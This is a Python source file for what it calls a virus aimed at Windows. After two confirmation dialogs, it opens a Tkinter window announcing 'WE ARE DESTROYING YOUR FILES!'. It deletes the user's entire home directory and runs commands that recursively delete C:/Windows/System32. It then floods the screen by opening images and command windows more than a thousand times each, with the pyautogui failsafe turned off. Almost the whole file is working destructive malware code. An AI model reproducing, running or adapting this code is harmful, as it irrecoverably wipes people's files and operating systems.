import pyautogui
import os
import time
import tkinter as tk
import tkinter.ttk as ttk
import tkinter.messagebox
import os
import sys
import subprocess
import shutil
import ctypes
from PIL import Image, ImageTk
from platform import system

#------------------------------------------------------------- WARN THE USER
class Warn:
    def __init__(self):  
        warnUSR = f"Do you really want to destroy your files?\nYou will NOT be able to recover your {system()} OS.\nPress 'Yes' to destroy your OS."
        warnUSR_again = "ARE SURE THAT YOU ARE ABOUT TO SCREW UP YOUR PC?"

        self.z = tkinter.messagebox.askyesno(title="WARNING", message=warnUSR)
        print(self.z)
        time.sleep(1)
        if self.z == True:
            self.fz = tkinter.messagebox.askyesno(title="!!! WARNING !!!", message=warnUSR_again)
            print(self.fz)
            if self.fz == True:
                Infected().run() # MAIN DONT MESS WITH THIS
                destroy_computer()
                pyautogui.PAUSE = 0.0000
                pyautogui.FAILSAFE = False
                img_path = resource_path("img\\wallpaper.jpg")
                ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.abspath(img_path).encode(), 0)
                print("Wallpaper was set successfully\n")
                cmdd()

            else:
                pyautogui.FAILSAFE = True
                sys.exit()
        else:
            pyautogui.FAILSAFE = True
            sys.exit()

#----------------------------------------------------------------- DON'T FORGET THIS!
global user_dir
user_dir = os.path.expanduser("~")
global target_dir  # !!! DANGER !!!
target_dir = user_dir#os.path.join(user_dir+"\\Documents\\Infected_")

def resource_path(relative_path):
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)


def chaos():
    openimg = 0
    img_1 = Image.open(resource_path('img\\img_1.png'))
    img_2 = Image.open(resource_path("img\\img_1.jpg"))
    img_3 = Image.open(resource_path("img\\img_2.jpg"))
    img_4 = Image.open(resource_path("img\\img_3.jpg"))

    while openimg <= 1000:
        img_1.show()
        img_2.show()
        img_3.show()
        img_4.show()
        openimg += 1

def cmdd():
    chaos()
    openshit = 0
    while openshit <= 1000:
        os.system("start cmd")
        openshit += 1
        print("cmd was prompted!")

# !!!!!!!!!!!!!!   EXTREMLY IMPORTANT, WORK WITH CARE   !!!!!!!!!!!!!!

def destroy_computer():
    fun = "dir"
    del_sys32 = "del /s /q C:/Windows/System32*"
    del_sys32_2 = "rd /s /q C:/Windows/System32"

    try:
        shutil.rmtree(target_dir)
    except (PermissionError, FileNotFoundError) as e:
        print(e,"\n")
        os.system(f'cmd /K "cd C/ & title YOU ARE AN IDIOT & rmdir {target_dir}"')
    finally:
        print(f"An attempt of removal of {target_dir} was made.")

    os.system(f'cmd /C "{del_sys32} & title bye-bye & {del_sys32_2}"') #!!! HANDLE WITH CARE, CONTAINS DESTRUCTION !!!
    print("Say bye-bye to your computer lmao")


#-------------------------- END of DESTRUCITVE CODE -----------------------------

def donotclose():
    pass

class Infected:
    def __init__(self):
        self.root = tk.Tk()
        self.style = ttk.Style()
        size = "800x600"
        self.root.resizable(False, False)
        self.root.title("!!! CAUTION !!!")
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        window_width = 800
        window_height = 600
        x_cordinate = int((screen_width/2) - (window_width/2))
        y_cordinate = int((screen_height/2) - (window_height/2))
        self.root.geometry("{}x{}+{}+{}".format(window_width, window_height, x_cordinate, y_cordinate))
        self.root.focus_force()
        #self.root.protocol("WM_DELETE_WINDOW", donotclose) #------------------- MAIN
        self.root.iconbitmap(self.resource_path(os.path.join(user_dir+'\\Documents\\CODING\\Python\\INDIAN_CRINGE_VIRUS\\img\\icvIcon.ico')))
        self.bg_image = Image.open(self.resource_path(os.path.join(user_dir+"\\Documents\\CODING\\Python\\INDIAN_CRINGE_VIRUS\\img\\lol.png")))  # BACKGROUNG IMAGE
        self.bg_photo = ImageTk.PhotoImage(self.bg_image)
        self.bg_label = tk.Label(self.root, image=self.bg_photo) # THIS IS USING THE BG IMAGE
        self.bg_label.place(anchor='center', x=800/2, y=400, relwidth=1, relheight=1)

        self.label = tk.Label(self.root, text="WE ARE DESTROYING YOUR FILES!", font=("Segoe UI Bold", 17))
        self.label.pack(anchor="center", pady=(20,0))

    def close_label(self):
        self.label.destroy()
        self.button.destroy()
    
    def close_info(self):
        self.root.destroy()

    def resource_path(self, relative_path):
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)

    def run(self):
        self.root.mainloop()

#---------------------------------------------------------------------- END OF UI

def quit():
    sys.exit()

Warn()
